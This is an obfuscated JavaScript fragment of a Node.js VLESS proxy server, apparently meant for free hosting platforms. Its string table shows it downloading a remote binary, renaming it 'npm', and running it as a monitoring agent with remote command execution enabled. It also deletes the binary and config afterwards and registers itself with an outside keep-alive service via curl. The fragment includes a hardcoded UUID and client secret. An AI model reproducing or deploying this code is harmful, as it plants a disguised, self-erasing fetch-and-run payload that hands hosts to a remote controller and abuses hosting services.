_0x27bc10=_0x5afca4[0x1],_0x244810=_0x5afca4[0x2]?parseInt(_0x5afca4[0x2]):null;if(_0x404f8f[_0x4b0cc1(0x1e0)]==='GET'&&!_0x244810){_0x1c6a80[_0x4b0cc1(0x23d)]='application/octet-stream',_0x1c6a80['Transfer-Encoding']=_0x4b0cc1(0x1a8);let _0x23bc0c=sessions[_0x4b0cc1(0x1e4)](_0x27bc10);!_0x23bc0c&&(_0x23bc0c=new Session(_0x27bc10),sessions[_0x4b0cc1(0x191)](_0x27bc10,_0x23bc0c),log(_0x4b0cc1(0x17d),'Created\x20new\x20session\x20for\x20GET:\x20'+_0x27bc10));_0x23bc0c[_0x4b0cc1(0x1b1)]=!![];!_0x23bc0c['startDownstream'](_0x495445,_0x1c6a80)&&(log(_0x4b0cc1(0x173),_0x4b0cc1(0x174)+_0x27bc10),!_0x495445[_0x4b0cc1(0x1aa)]&&(_0x495445[_0x4b0cc1(0x169)](0x1f4),_0x495445[_0x4b0cc1(0x184)]()),_0x23bc0c[_0x4b0cc1(0x218)](),sessions['delete'](_0x27bc10));return;}if(_0x404f8f['method']==='POST'&&_0x244810!==null){let _0x587342=sessions[_0x4b0cc1(0x1e4)](_0x27bc10);!_0x587342&&(_0x587342=new Session(_0x27bc10),sessions[_0x4b0cc1(0x191)](_0x27bc10,_0x587342),log('info',_0x4b0cc1(0x1d6)+_0x27bc10),setTimeout(()=>{const _0x31ae36=_0x4b0cc1,_0xd98796=sessions['get'](_0x27bc10);_0xd98796&&!_0xd98796[_0x31ae36(0x1b1)]&&(log(_0x31ae36(0x1a2),'Session\x20'+_0x27bc10+_0x31ae36(0x19b)),_0xd98796[_0x31ae36(0x218)](),sessions[_0x31ae36(0x1c3)](_0x27bc10));},SETTINGS[_0x4b0cc1(0x1be)]));let _0x55aabc=[],_0x53227c=0x0,_0x27cee2=![];_0x404f8f['on']('data',_0x14c182=>{const _0x316972=_0x4b0cc1;_0x53227c+=_0x14c182[_0x316972(0x200)];if(_0x53227c>SETTINGS['MAX_POST_SIZE']){!_0x27cee2&&(_0x495445[_0x316972(0x169)](0x19d),_0x495445[_0x316972(0x184)](),_0x27cee2=!![]);return;}_0x55aabc[_0x316972(0x1dd)](_0x14c182);}),_0x404f8f['on']('end',async()=>{const _0x5972f5=_0x4b0cc1;if(_0x27cee2)return;try{const _0x24c722=Buffer[_0x5972f5(0x246)](_0x55aabc);log(_0x5972f5(0x17d),_0x5972f5(0x1de)+_0x244810+_0x5972f5(0x22a)+_0x24c722[_0x5972f5(0x200)]),await _0x587342[_0x5972f5(0x215)](_0x244810,_0x24c722),!_0x27cee2&&(_0x495445[_0x5972f5(0x169)](0xc8,_0x1c6a80),_0x27cee2=!![]),_0x495445['end']();}catch(_0x12febd){log(_0x5972f5(0x173),_0x5972f5(0x1e9)+_0x12febd[_0x5972f5(0x23a)]),_0x587342[_0x5972f5(0x218)](),sessions[_0x5972f5(0x1c3)](_0x27bc10),!_0x27cee2&&(_0x495445[_0x5972f5(0x169)](0x1f4),_0x27cee2=!![]),_0x495445[_0x5972f5(0x184)]();}});return;}_0x495445[_0x4b0cc1(0x169)](0x194),_0x495445[_0x4b0cc1(0x184)]();});server['on'](_0x15b22a(0x1dc),_0xee8e6e=>{const _0x5a9516=_0x15b22a;log('debug',_0x5a9516(0x209)+(_0xee8e6e[_0x5a9516(0x1f2)]||'http/1.1'));});function generatePadding(_0x28122a,_0x198225){const _0x38497b=_0x15b22a,_0xdb8b5a=_0x28122a+Math[_0x38497b(0x170)](Math['random']()*(_0x198225-_0x28122a));return Buffer[_0x38497b(0x186)](Array(_0xdb8b5a)[_0x38497b(0x21c)]('X')['join'](''))[_0x38497b(0x172)](_0x38497b(0x18b));}server[_0x15b22a(0x225)]=0x975e0,server['headersTimeout']=0x98968,server['on'](_0x15b22a(0x173),_0x4eec2e=>{const _0x4c5d3c=_0x15b22a;log(_0x4c5d3c(0x173),'Server\x20error:\x20'+_0x4eec2e[_0x4c5d3c(0x23a)]);});function _0x20a0(){const _0x4a9713=['reduce','info','443','/([^/]+)(?:/([0-9]+))?$','pipe','vlessHeader','TCP_KEEPALIVE','TCP_NODELAY','end','socket\x20hang\x20up','from','setNoDelay','Error\x20added\x20Task:','&fp=chrome&allowInsecure=1&type=xhttp&host=','XPATH','base64',':443?encryption=none&security=tls&sni=','unsupported\x20command:\x20','Connection\x20failed:\x20','currentStreamRes','vless://','set','log','2053','BUFFER_SIZE','&path=','read','a2056d0d-c98e-4aeb-9aab-37f64edd5710','_writeToRemote','369tmiWVu','createWriteStream','\x20timed\x20out\x20without\x20downstream','NEZHA_SERVER','text/plain','AUTO_ACCESS','now','DOMAIN','PORT','warn','Error\x20sending\x20request:','createServer','Failed\x20to\x20parse\x20hostname','config.yaml','toISOString','chunked','has','headersSent','net','\x20bytes','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','destroy','uuid','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','downstreamStarted','Socket\x20is\x20destroyed','\x1b[32m','4423370jjtYis','jj.jaiyu.dpdns.org:8008','url','nextSeq','debug','Client\x20connection\x20closed','size','2083','Created\x20new\x20session\x20with\x20UUID:\x20','Cleanup\x20error:\x20','SESSION_TIMEOUT','pop','VLESS\x20header\x20parse\x20error:\x20','hostname','Remote\x20error:\x20','delete','releaseLock','205824lZbcBx','catch','CHUNK_SIZE','636911OgEypx','LOG_LEVEL','text/html','enqueue','destroyed','pendingPackets','1493706pdjKxJ','decode','resume','Received\x20out\x20of\x20order\x20packet\x20seq=','pipeTo','7Ner02g5Khs71ghjlSZGfjKjdFilje5K','\x1b[33m','Read\x20controller\x20error:','Created\x20new\x20session\x20for\x20POST:\x20','npm\x20running\x20error:\x20','Error\x20starting\x20downstream:\x20','arm64','readFile','2096','secureConnection','push','Processing\x20packet:\x20seq=','join','method','UUID','stream','\x1b[31m','get','utf8','reset','npm\x20is\x20running','Remote\x20connection\x20not\x20available','Failed\x20to\x20process\x20POST\x20request:\x20','--tls','30320DMuTTH','readable','Socket\x20error:','https://','slice','Cleaning\x20up\x20session\x20','includes','alpnProtocol','listen','substr','bufferSize','env','2048','no-store','2186646qEwumg','MAX_BUFFERED_POSTS','pendingBuffers','done','initialized','headerSent','data','length','Failed\x20to\x20initialize\x20VLESS\x20connection','parse\x20hostname\x20failed','unlink','npm','arm','initializeVLESS','SUB_PATH','Download\x20error:\x20','New\x20secure\x20connection\x20using:\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','NEZHA_PORT','NAME','setKeepAlive','http','forEach','aborted','\x0aclient_secret:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','remote','write','processPacket','https://qwe8899-a.hf.space','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','cleanup','createConnection','Server\x20is\x20running\x20on\x20port\x20','VLESS\x20connection\x20to\x20','fill','match','chmod\x20+x\x20npm','lastActivity','uncork','264ixHvSR','Read\x20controller\x20close\x20error:','socket','writableEnded','keepAliveTimeout','Process\x20packet\x20error:\x20','&mode=packet-up#','trim','npm\x20download\x20successfully',',\x20size=','replaceAll','5278665wrGkOB','true','VLESS\x20header\x20parsed:\x20','writable','Automatic\x20Access\x20Task\x20added\x20successfully:','):\x20','value','_startDownstreamResponse','index.html','connect\x20timeout','port','connect','Processed\x20packet\x20seq=','Failed\x20to\x20get\x20IP\x20address:','message','invalid\x20UUID','8443','Content-Type','getReader',']\x20[','bufferedData','pause','GET,\x20POST','Remote\x20connection\x20established','Too\x20many\x20buffered\x20packets','utf-8','concat','Failed\x20to\x20write\x20to\x20remote:\x20','Starting\x20to\x20parse\x20VLESS\x20header','resp','localhost','writeHead','axios','none','https://amd64.ssss.nyc.mn/agent','cleaned','read\x20address\x20type\x20failed','VLESS\x20header\x20parsed\x20successfully','floor','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','toString','error','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','\x20-p\x20','Upload\x20error:\x20','finally','getWriter','responseHeader','Hug','close'];_0x20a0=function(){return _0x4a9713;};return _0x20a0();}const delFiles=()=>{const _0x7c2da7=_0x15b22a;[_0x7c2da7(0x204),'config.yaml'][_0x7c2da7(0x20f)](_0x441c9f=>fs[_0x7c2da7(0x203)](_0x441c9f,()=>{}));};server[_0x15b22a(0x1f3)](PORT,()=>{const _0x1795a6=_0x15b22a;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x1795a6(0x192)](_0x1795a6(0x21a)+PORT);});
